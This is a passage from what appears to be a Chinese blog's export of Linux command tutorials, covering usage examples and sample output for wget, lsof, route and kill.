-p:下载所有为了html页面显示正常的文件 –convert-links:下载后，转换成本地的链接 -P ./LOCAL：保存所有文件和目录到本地指定目录 实例11：使用wget –reject过滤指定格式下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget --reject=gif ur &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下载一个网站，但你不希望下载图片，可以使用以下命令。 实例12：使用wget -o把下载信息存入日志文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -o download.log URL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;不希望下载信息直接显示在终端而是在一个日志文件，可以使用 实例13：使用wget -Q限制总下载文件大小&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -Q5m -i filelist.txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当你想要下载的文件超过5M而退出下载，你可以使用。注意：这个参数对单个文件下载不起作用，只能递归下载时才有效。 实例14：使用wget -r -A下载指定格式文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1wget -r -A.pdf url &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以在以下情况使用该功能： 下载一个网站的所有图片 下载一个网站的所有视频 下载一个网站的所有PDF文件 实例15：使用wget FTP下载&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12wget ftp-urlwget --ftp-user=USERNAME --ftp-password=PASSWORD url &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以使用wget来完成ftp链接的下载。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用wget匿名ftp下载： 1wget ftp-url &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用wget用户名和密码认证的ftp下载 1wget --ftp-user=USERNAME --ftp-password=PASSWORD url &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注：编译安装使用如下命令编译安装： 12345# tar zxvf wget-1.9.1.tar.gz # cd wget-1.9.1 # ./configure # make # make install]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- lsof]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F53.%20Linux%20%E5%91%BD%E4%BB%A4-%20lsof%2F</url>
    <content type="text"><![CDATA[Linux 命令- lsof&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lsof（list open files）是一个列出当前系统打开文件的工具。在linux环境下，任何事物都以文件的形式存在，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件。所以如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，无论这个文件的本质如何，该文件描述符为应用程序与基础操作系统之间的交互提供了通用接口。因为应用程序打开文件的描述符列表提供了大量关于这个应用程序本身的信息，因此通过lsof工具能够查看这个列表对系统监测以及排错将是很有帮助的。 1．命令格式1lsof [参数] [文件] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用于查看你进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。找回/恢复删除的文件。是十分方便的系统监视工具，因为 lsof 需要访问核心内存和各种文件，所以需要root用户执行。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lsof打开的文件可以是： 普通文件 目录 网络文件系统的文件 字符或设备文件 (函数)共享库 管道，命名管道 符号链接 网络文件（例如：NFS file、网络socket，unix域名socket） 还有其它类型的文件，等等 3．命令参数 -a 列出打开文件存在的进程 -c&lt;进程名&gt; 列出指定进程所打开的文件 -g 列出GID号进程详情 -d&lt;文件号&gt; 列出占用该文件号的进程 +d&lt;目录&gt; 列出目录下被打开的文件 +D&lt;目录&gt; 递归列出目录下被打开的文件 -n&lt;目录&gt; 列出使用NFS的文件 -i&lt;条件&gt; 列出符合条件的进程。（4、6、协议、:端口、 @ip ） -p&lt;进程号&gt; 列出指定进程号所打开的文件 -u 列出UID号进程详情 -h 显示帮助信息 -v 显示版本信息 4．使用实例实例1：无任何参数&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516171819202122232425262728[root@localhost ~]# lsofCOMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEinit 1 root cwd DIR 8,2 4096 2 /init 1 root rtd DIR 8,2 4096 2 /init 1 root txt REG 8,2 43496 6121706 /sbin/initinit 1 root mem REG 8,2 143600 7823908 /lib64/ld-2.5.soinit 1 root mem REG 8,2 1722304 7823915 /lib64/libc-2.5.soinit 1 root mem REG 8,2 23360 7823919 /lib64/libdl-2.5.soinit 1 root mem REG 8,2 95464 7824116 /lib64/libselinux.so.1init 1 root mem REG 8,2 247496 7823947 /lib64/libsepol.so.1init 1 root 10u FIFO 0,17 1233 /dev/initctlmigration 2 root cwd DIR 8,2 4096 2 /migration 2 root rtd DIR 8,2 4096 2 /migration 2 root txt unknown /proc/2/exeksoftirqd 3 root cwd DIR 8,2 4096 2 /ksoftirqd 3 root rtd DIR 8,2 4096 2 /ksoftirqd 3 root txt unknown /proc/3/exemigration 4 root cwd DIR 8,2 4096 2 /migration 4 root rtd DIR 8,2 4096 2 /migration 4 root txt unknown /proc/4/exeksoftirqd 5 root cwd DIR 8,2 4096 2 /ksoftirqd 5 root rtd DIR 8,2 4096 2 /ksoftirqd 5 root txt unknown /proc/5/exeevents/0 6 root cwd DIR 8,2 4096 2 /events/0 6 root rtd DIR 8,2 4096 2 /events/0 6 root txt unknown /proc/6/exeevents/1 7 root cwd DIR 8,2 4096 2 / &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;lsof输出各列信息的意义如下： COMMAND：进程的名称 PID：进程标识符 PPID：父进程标识符（需要指定-R参数） USER：进程所有者 PGID：进程所属组 FD：文件描述符，应用程序通过文件描述符识别该文件。如cwd、txt等 （1）cwd：表示current work dirctory，即：应用程序的当前工作目录，这是该应用程序启动的目录，除非它本身对这个目录进行更改 （2）txt ：该类型的文件是程序代码，如应用程序二进制文件本身或共享库，如上列表中显示的 /sbin/init 程序 （3）lnn：library references (AIX); （4）er：FD information error (see NAME column); （5）jld：jail directory (FreeBSD); （6）ltx：shared library text (code and data); （7）mxx ：hex memory-mapped type number xx. （8）m86：DOS Merge mapped file; （9）mem：memory-mapped file; （10）mmap：memory-mapped device; （11）pd：parent directory; （12）rtd：root directory; （13）tr：kernel trace file (OpenBSD); （14）v86 VP/ix mapped file; （15）0：表示标准输出 （16）1：表示标准输入 （17）2：表示标准错误 一般在标准输出、标准错误、标准输入后还跟着文件状态模式：r、w、u等 （1）u：表示该文件被打开并处于读取/写入模式 （2）r：表示该文件被打开并处于只读模式 （3）w：表示该文件被打开并处于 （4）空格：表示该文件的状态模式为unknow，且没有锁定 （5）-：表示该文件的状态模式为unknow，且被锁定 同时在文件状态模式后面，还跟着相关的锁 （1）N：for a Solaris NFS lock of unknown type; （2）r：for read lock on part of the file; （3）R：for a read lock on the entire file; （4）w：for a write lock on part of the file;（文件的部分写锁） （5）W：for a write lock on the entire file;（整个文件的写锁） （6）u：for a read and write lock of any length; （7）U：for a lock of unknown type; （8）x：for an SCO OpenServer Xenix lock on part of the file; （9）X：for an SCO OpenServer Xenix lock on the entire file; （10）space：if there is no lock. TYPE：文件类型，如DIR、REG等，常见的文件类型 （1）DIR：表示目录 （2）CHR：表示字符类型 （3）BLK：块设备类型 （4）UNIX： UNIX 域套接字 （5）FIFO：先进先出 (FIFO) 队列 （6）IPv4：网际协议 (IP) 套接字 DEVICE：指定磁盘的名称 SIZE：文件的大小 NODE：索引节点（文件在磁盘上的标识） NAME：打开文件的确切名称 实例2：查看谁正在使用某个文件，也就是说查找某个文件相关的进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof /bin/bash &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# lsof /bin/bashCOMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEbash 24159 root txt REG 8,2 801528 5368780 /bin/bashbash 24909 root txt REG 8,2 801528 5368780 /bin/bashbash 24941 root txt REG 8,2 801528 5368780 /bin/bash[root@localhost ~]# 实例3：递归查看某个目录的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof test/test3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456[root@localhost ~]# cd /opt/soft/[root@localhost soft]# lsof test/test3COMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEbash 24941 root cwd DIR 8,2 4096 2258872 test/test3vi 24976 root cwd DIR 8,2 4096 2258872 test/test3[root@localhost soft]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用了+D，对应目录下的所有子目录和文件都会被列出 实例4：不使用+D选项，遍历查看某个目录的所有文件信息的方法&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof |grep 'test/test3' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost soft]# lsof |grep 'test/test3'bash 24941 root cwd DIR 8,2 4096 2258872 /opt/soft/test/test3vi 24976 root cwd DIR 8,2 4096 2258872 /opt/soft/test/test3vi 24976 root 4u REG 8,2 12288 2258882 /opt/soft/test/test3/.log2013.log.swp[root@localhost soft]# 实例5：列出某个用户打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -u username &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-u 选项，u其实是user的缩写 实例6：列出某个程序进程所打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -c mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;-c 选项将会列出所有以mysql这个进程开头的程序的文件，其实你也可以写成 lsof | grep mysql, 但是第一种方法明显比第二种方法要少打几个字符了 实例7：列出多个进程多个打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -c mysql -c apache 实例8：列出某个用户以及某个进程所打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -u test -c mysql &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;用户与进程可相关，也可以不相关 实例9：列出除了某个用户外的被打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -u ^root &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;^这个符号在用户名之前，将会把是root用户打开的进程不让显示 实例10：通过某个进程号显示该进行打开的文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -p 1 实例11：列出多个进程号对应的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -p 1,2,3 实例12：列出除了某个进程号，其他进程号所打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -p ^1 实例13：列出所有的网络连接&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i 实例14：列出所有tcp 网络连接信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i tcp 实例15：列出所有udp网络连接信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i udp 实例16：列出谁在使用某个端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i :3306 实例17：列出谁在使用某个特定的udp端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i udp:55 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;或者：特定的tcp端口 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i tcp:80 实例18：列出某个用户的所有活跃的网络端口&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -a -u test -i 实例19：列出所有网络文件系统&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -N 实例20：域名socket文件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -u 实例21：某个用户组所打开的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -g 5555 实例22：根据文件描述列出对应的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1234lsof -d description(like 2)例如：lsof -d txt例如：lsof -d 1例如：lsof -d 2 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;0表示标准输入，1表示标准输出，2表示标准错误，从而可知：所以大多数应用程序所打开的文件的 FD 都是从 3 开始 实例23：根据文件描述范围列出文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -d 2-3 实例24：列出COMMAND列中包含字符串” sshd”，且文件描符的类型为txt的文件信息&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -c sshd -a -d txt &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678[root@localhost soft]# lsof -c sshd -a -d txtCOMMAND PID USER FD TYPE DEVICE SIZE NODE NAMEsshd 2756 root txt REG 8,2 409488 1027867 /usr/sbin/sshdsshd 24155 root txt REG 8,2 409488 1027867 /usr/sbin/sshdsshd 24905 root txt REG 8,2 409488 1027867 /usr/sbin/sshdsshd 24937 root txt REG 8,2 409488 1027867 /usr/sbin/sshd[root@localhost soft]# [root@localhost soft]# 实例25：列出被进程号为1234的进程所打开的所有IPV4 network files&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i 4 -a -p 1234 实例26：列出目前连接主机peida.linux上端口为：20，21，22，25，53，80相关的所有文件信息，且每隔3秒不断的执行lsof指令&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1lsof -i @peida.linux:20,21,22,25,53,80 -r 3]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- route]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F55.%20Linux%20%E5%91%BD%E4%BB%A4-%20route%2F</url>
    <content type="text"><![CDATA[Linux 命令- route&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux系统的route命令用于显示和操作IP路由表（show / manipulate the IP routing table）。要实现两个不同的子网之间的通信，需要一台连接两个网络的路由器，或者同时位于两个网络的网关来实现。在Linux系统中，设置路由通常是为了解决以下问题：该Linux系统在一个局域网中，局域网中有一个网关，能够让机器访问Internet，那么就需要将这台机器的IP地址设置为Linux机器的默认路由。要注意的是，直接在命令行下执行route命令来添加路由，不会永久保存，当网卡重启或者机器重启之后，该路由就失效了；可以在/etc/rc.local中添加route命令来保证该路由设置永久有效。 1．命令格式1route [-f] [-p] [Command [Destination] [mask Netmask] [Gateway] [metric Metric]] [if Interface]] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Route命令是用于操作基于内核ip路由表，它的主要作用是创建一个静态路由让指定一个主机或者一个网络通过一个网络接口，如eth0。当使用”add”或者”del”参数时，路由表被修改，如果没有参数，则显示路由表当前的内容。 3．命令参数 -c 显示更多信息 -n 不解析名字 -v 显示详细的处理信息 -F 显示发送信息 -C 显示路由缓存 -f 清除所有网关入口的路由表。 -p 与 add 命令一起使用时使路由具有永久性。 add:添加一条新路由。 del:删除一条路由。 -net:目标地址是一个网络。 -host:目标地址是一个主机。 netmask:当添加一个网络路由时，需要使用网络掩码。 gw:路由数据包通过网关。注意，你指定的网关必须能够达到。 metric：设置路由跳数。 Command 指定您想运行的命令 (Add/Change/Delete/Print)。 Destination 指定该路由的网络目标。 mask Netmask 指定与网络目标相关的网络掩码（也被称作子网掩码）。 Gateway 指定网络目标定义的地址集和子网掩码可以到达的前进或下一跃点 IP 地址。 metric Metric 为路由指定一个整数成本值标（从 1 至 9999），当在路由表(与转发的数据包目标地址最匹配)的多个路由中进行选择时可以使用。 if Interface 为可以访问目标的接口指定接口索引。若要获得一个接口列表和它们相应的接口索引，使用 route print 命令的显示功能。可以使用十进制或十六进制值进行接口索引。 4．使用实例实例1：显示当前路由&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12routeroute -n &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0e192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# route -nKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 0.0.0.0 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth00.0.0.0 192.168.120.240 0.0.0.0 UG 0 0 0 eth0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第一行表示主机所在网络的地址为192.168.120.0，若数据传送目标是在本局域网内通信，则可直接通过eth0转发数据包; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;第四行表示数据传送目的是访问Internet，则由接口eth0，将数据包发送到网关192.168.120.240 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中Flags为路由标志，标记当前网络节点的状态。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Flags标志说明： U Up表示此路由当前为启动状态 H Host，表示此网关为一主机 G Gateway，表示此网关为一路由器 R Reinstate Route，使用动态路由重新初始化的路由 D Dynamically,此路由是动态性地写入 M Modified，此路由是由路由守护程序或导向器动态修改 ! 表示此路由当前为关闭状态 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;备注： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;route -n (-n 表示不解析名字,列出速度会比route 快) 实例2：添加网关/设置网关&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# route add -net 224.0.0.0 netmask 240.0.0.0 dev eth0[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0224.0.0.0 * 240.0.0.0 U 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加一条 到达244.0.0.0的路由 实例3：屏蔽一条路由&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1route add -net 224.0.0.0 netmask 240.0.0.0 reject &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910[root@localhost ~]# route add -net 224.0.0.0 netmask 240.0.0.0 reject[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0224.0.0.0 - 240.0.0.0 ! 0 - 0 -224.0.0.0 * 240.0.0.0 U 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;增加一条屏蔽的路由，目的地址为 224.x.x.x 将被拒绝 实例4：删除路由记录&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12route del -net 224.0.0.0 netmask 240.0.0.0route del -net 224.0.0.0 netmask 240.0.0.0 reject &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 123456789101112131415161718192021222324252627[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0224.0.0.0 - 240.0.0.0 ! 0 - 0 -224.0.0.0 * 240.0.0.0 U 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# route del -net 224.0.0.0 netmask 240.0.0.0[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0224.0.0.0 - 240.0.0.0 ! 0 - 0 -default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# route del -net 224.0.0.0 netmask 240.0.0.0 reject[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]# 实例5：删除和添加设置默认网关&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12route del default gw 192.168.120.240route add default gw 192.168.120.240 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345678910111213141516[root@localhost ~]# route del default gw 192.168.120.240[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0[root@localhost ~]# route add default gw 192.168.120.240[root@localhost ~]# routeKernel IP routing tableDestination Gateway Genmask Flags Metric Ref Use Iface192.168.120.0 * 255.255.255.0 U 0 0 0 eth0192.168.0.0 192.168.120.1 255.255.0.0 UG 0 0 0 eth010.0.0.0 192.168.120.1 255.0.0.0 UG 0 0 0 eth0default 192.168.120.240 0.0.0.0 UG 0 0 0 eth0[root@localhost ~]#]]></content>
      <tags>
        <tag>Linux命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux 命令- kill]]></title>
    <url>%2F2017%2F08%2F14%2F2.%20Linux%20%E5%91%BD%E4%BB%A4%2F44.%20Linux%20%E5%91%BD%E4%BB%A4-%20kill%2F</url>
    <content type="text"><![CDATA[Linux 命令- kill&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux中的kill命令用来终止指定的进程（terminate a process）的运行，是Linux下进程管理的常用命令。通常，终止一个前台进程可以使用Ctrl+C键，但是，对于一个后台进程就须用kill命令来终止，我们就需要先使用ps/pidof/pstree/top等工具获取进程PID，然后使用kill命令来杀掉该进程。kill命令是通过向进程发送指定的信号来结束相应进程的。在默认情况下，采用编号为15的TERM信号。TERM信号将终止所有不能捕获该信号的进程。对于那些可以捕获该信号的进程就要用编号为9的kill信号，强行“杀掉”该进程。 1．命令格式1kill[参数][进程号] 2．命令功能&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;发送指定的信号到相应进程。不指定型号将发送SIGTERM（15）终止指定进程。如果任无法终止该程序可用“-KILL” 参数，其发送的信号为SIGKILL(9) ，将强制结束进程，使用ps命令或者jobs 命令可以查看进程号。root用户将影响用户的进程，非root用户只能影响自己的进程。 3．命令参数 -l 信号，若果不加信号的编号参数，则使用“-l”参数会列出全部的信号名称 -a 当处理当前进程时，不限制命令名和进程号的对应关系 -p 指定kill 命令只打印相关进程的进程号，而不发送任何信号 -s 指定发送信号 -u 指定用户 注意： kill命令可以带信号号码选项，也可以不带。如果没有信号号码，kill命令就会发出终止信号(15)，这个信号可以被进程捕获，使得进程在退出之前可以清理并释放资源。也可以用kill向进程发送特定的信号。例如：kill -2 123它的效果等同于在前台运行PID为123的进程时按下Ctrl+C键。但是，普通用户只能使用不带signal参数的kill命令或最多使用-9信号。 kill可以带有进程ID号作为参数。当用kill向这些进程发送信号时，必须是这些进程的主人。如果试图撤销一个没有权限撤销的进程或撤销一个不存在的进程，就会得到一个错误信息。 可以向多个进程发信号或终止它们。 当kill成功地发送了信号后，shell会在屏幕上显示出进程的终止信息。有时这个信息不会马上显示，只有当按下Enter键使shell的命令提示符再次出现时，才会显示出来。 应注意，信号使进程强行终止，这常会带来一些副作用，如数据丢失或者终端无法恢复到正常状态。发送信号时必须小心，只有在万不得已时，才用kill信号(9)，因为进程不能首先捕获它。要撤销所有的后台作业，可以输入kill 0。因为有些在后台运行的命令会启动多个进程，跟踪并找到所有要杀掉的进程的PID是件很麻烦的事。这时，使用kill 0来终止所有由当前shell启动的进程，是个有效的方法。 4．使用实例实例1：列出所有信号名称&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1kill -l &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567891011121314151617[root@localhost test6]# kill -l 1) SIGHUP 2) SIGINT 3) SIGQUIT 4) SIGILL 5) SIGTRAP 6) SIGABRT 7) SIGBUS 8) SIGFPE 9) SIGKILL 10) SIGUSR1 11) SIGSEGV 12) SIGUSR213) SIGPIPE 14) SIGALRM 15) SIGTERM 16) SIGSTKFLT17) SIGCHLD 18) SIGCONT 19) SIGSTOP 20) SIGTSTP21) SIGTTIN 22) SIGTTOU 23) SIGURG 24) SIGXCPU25) SIGXFSZ 26) SIGVTALRM 27) SIGPROF 28) SIGWINCH29) SIGIO 30) SIGPWR 31) SIGSYS 34) SIGRTMIN35) SIGRTMIN+1 36) SIGRTMIN+2 37) SIGRTMIN+3 38) SIGRTMIN+439) SIGRTMIN+5 40) SIGRTMIN+6 41) SIGRTMIN+7 42) SIGRTMIN+843) SIGRTMIN+9 44) SIGRTMIN+10 45) SIGRTMIN+11 46) SIGRTMIN+1247) SIGRTMIN+13 48) SIGRTMIN+14 49) SIGRTMIN+15 50) SIGRTMAX-1451) SIGRTMAX-13 52) SIGRTMAX-12 53) SIGRTMAX-11 54) SIGRTMAX-1055) SIGRTMAX-9 56) SIGRTMAX-8 57) SIGRTMAX-7 58) SIGRTMAX-659) SIGRTMAX-5 60) SIGRTMAX-4 61) SIGRTMAX-3 62) SIGRTMAX-263) SIGRTMAX-1 64) SIGRTMAX &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只有第9种信号(SIGKILL)才可以无条件终止进程，其他信号进程都有权利忽略。 下面是常用的信号： 1234567HUP 1 终端断线INT 2 中断（同 Ctrl + C）QUIT 3 退出（同 Ctrl + \）TERM 15 终止KILL 9 强制终止CONT 18 继续（与STOP相反， fg/bg命令）STOP 19 暂停（同 Ctrl + Z） 实例2：得到指定信号的数值&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12345[root@localhost test6]# kill -l KILL9[root@localhost test6]# kill -l SIGKILL9[root@localhost test6]# kill -l TERM15[root@localhost test6]# kill -l SIGTERM15[root@localhost test6]# 实例3：先用ps查找进程，然后用kill杀掉&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1kill 3268 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test6]# ps -ef|grep vim root 3268 2884 0 16:21 pts/1 00:00:00 vim install.logroot 3370 2822 0 16:21 pts/0 00:00:00 grep vim[root@localhost test6]# kill 3268 [root@localhost test6]# kill 3268 -bash: kill: (3268) - 没有那个进程[root@localhost test6]# 实例4：彻底杀死进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 1kill –9 3268 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 1234567[root@localhost test6]# ps -ef|grep vim root 3268 2884 0 16:21 pts/1 00:00:00 vim install.logroot 3370 2822 0 16:21 pts/0 00:00:00 grep vim[root@localhost test6]# kill –9 3268 [root@localhost test6]# kill 3268 -bash: kill: (3268) - 没有那个进程[root@localhost test6]# 实例5：杀死指定用户所有进程&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;命令 12kill -9 $(ps -ef | grep peidalinux)kill -u peidalinux &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;输出 12[root@localhost ~]# kill -9 $(ps -ef | grep peidalinux) [root@localhost ~]# kill -u peidalinux &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;方法一，过滤出hnlinux用户进程并杀死 